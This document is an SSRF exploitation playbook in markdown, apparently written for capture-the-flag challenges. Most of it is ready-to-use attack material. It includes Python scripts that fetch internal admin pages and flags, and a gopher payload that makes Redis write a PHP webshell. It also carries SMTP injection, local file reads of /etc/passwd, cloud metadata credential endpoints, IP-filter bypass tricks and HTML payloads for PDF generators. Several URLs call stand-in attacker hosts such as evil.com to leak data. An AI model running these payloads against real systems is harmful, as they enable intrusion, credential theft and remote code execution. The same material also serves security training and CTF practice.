## SSRF Playbook

### Workflow: Find → Confirm → Exploit

**Stage 1 — Find the SSRF endpoint:**
- Read source code for URL-fetching: `urlopen()`, `requests.get()`, `urllib`, `fetch()`, `http.get()`
- Look for: profile picture URLs, import features, webhooks, PDF generators, link previews, URL converters, markdown/HTML renderers
- Test with POST — many SSRF endpoints are POST-only (`/convert`, `/fetch`, `/import`)

**Stage 2 — Confirm SSRF:**
Send internal URLs as the parameter value:
- `http://127.0.0.1`, `http://localhost`, `http://127.0.0.1:80`
- Compare response to normal request — different content/length = SSRF confirmed

**Stage 3 — Exploit:**

**Classic SSRF (response returned to you):**
```python
import requests
s = requests.Session()
# Login if needed
s.post('TARGET/login', data={'username': 'test', 'password': 'test'})
# Fetch internal resources
for target in ['http://127.0.0.1/admin', 'http://127.0.0.1/admin/flag',
               'http://127.0.0.1/flag', 'http://localhost/flag.txt',
               'file:///flag.txt', 'file:///app/FLAG.txt']:
    r = s.post('TARGET/fetch', data={'url': target})
    print(f"{target}: {r.text[:200]}")
```

**SSRF via profile/settings (multi-step):**
```python
import requests
s = requests.Session()
s.post('TARGET/register', data={'username': 'attacker', 'password': 'pass123'})
s.post('TARGET/login', data={'username': 'attacker', 'password': 'pass123'})
# Set profile picture URL to SSRF target
s.post('TARGET/profile', data={'profile_picture_url': 'http://127.0.0.1/admin/flag'})
r = s.get('TARGET/profile')
print(r.text)
```

**SSRF in markdown/HTML converter:**
- Markdown: `![img](http://127.0.0.1/admin/flag)`
- HTML: `<img src="http://127.0.0.1/admin">`, `<iframe src="http://127.0.0.1/flag">`

### Protocol Abuse (beyond HTTP)
Try different URL schemes — each exposes different attack surface:
- `file:///etc/passwd`, `file:///flag.txt` — local file read
- `dict://127.0.0.1:PORT/info` — dictionary protocol, probe internal services
- `gopher://127.0.0.1:PORT/_PAYLOAD` — raw TCP, most powerful for internal exploitation
- `sftp://evil.com/` — may leak SSH banner or credentials
- `tftp://evil.com/file` — UDP-based, may exfiltrate data
- `ldap://evil.com/` — may leak server info

**Gopher protocol exploitation** (when available):
```
# Redis — write webshell
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a<%3fphp%20system($_GET['cmd'])%3b%3f>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# SMTP — send email
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:%3cattacker@evil.com%3e%0d%0aRCPT%20TO:%3cvictim@target.com%3e%0d%0a
```

### Exploitation Targets (what to fetch)
- Admin panel: `http://127.0.0.1/admin`, `http://127.0.0.1/admin/flag`
- Internal services: `http://127.0.0.1:PORT` — try 80, 8080, 3000, 5000, 8333, 9200
- Password reset: `http://127.0.0.1/reset_password?username=admin&newpassword=hacked`
- Local files: `file:///etc/passwd`, `file:///flag.txt`, `file:///app/FLAG.txt`
- Docker service names from docker-compose: `internal-service`, `backend`, `api`, `db`

**Cloud Metadata (if cloud-hosted):**
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# GCP
http://metadata.google.internal/computeMetadata/v1/
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### IP Restriction Bypass
Many endpoints restrict by remote IP (`if request.remote_addr != 127.0.0.1: deny`).
SSRF makes the server itself call the endpoint → remote_addr IS 127.0.0.1 → bypasses IP check!

### URL Filter Bypass (try in order)
1. **IP obfuscation**: Decimal `http://2130706433` (= 127.0.0.1), Hex `http://0x7f000001`, Octal `http://0177.0.0.1`
2. **Short forms**: `http://0/`, `http://127.1/`, `http://0.0.0.0/`
3. **IPv6**: `http://[::1]`, `http://[0:0:0:0:0:ffff:127.0.0.1]`
4. **URL encoding**: `http://127.0.0.%31`, double-encode `%2531`
5. **`@` trick**: `http://allowed.com@127.0.0.1/` — username portion ignored
6. **Fragment**: `http://127.0.0.1#@allowed.com`
7. **DNS rebinding**: domain that first resolves to allowed IP, then to 127.0.0.1
8. **Open redirect**: chain SSRF through app's own redirect: `http://target.com/redirect?url=http://127.0.0.1/admin`
9. **Proxy misconfiguration (Flask)**: `http://attacker@127.0.0.1/admin` — Flask's `url_for` may bypass checks
10. **Proxy misconfiguration (Spring Boot)**: `http://127.0.0.1;@allowed.com/admin` — semicolon tricks

### Blind SSRF (no response returned)
When you can't see the response:
- **Time-based**: measure response time differences between valid internal hosts (fast) and invalid (slow/timeout)
- **Status code differences**: `http://127.0.0.1:22` (SSH — connection reset) vs `http://127.0.0.1:80` (HTTP — success)
- **Port scanning**: iterate ports `http://127.0.0.1:PORT`, note which return different status/timing
- **DNS callback**: use a DNS logger (e.g., Burp Collaborator) to confirm SSRF fires
- **Error messages**: some apps leak partial response info in error messages

### SSRF in PDF/Document Generators
If the app generates PDFs from user input:
```html
<iframe src="file:///etc/passwd" width="100%" height="100%">
<img src="http://127.0.0.1/admin">
<link rel="stylesheet" href="http://127.0.0.1/admin">
<script>document.location='http://127.0.0.1/admin'</script>
```
Try injecting HTML/CSS in user-controlled fields that end up in PDFs.
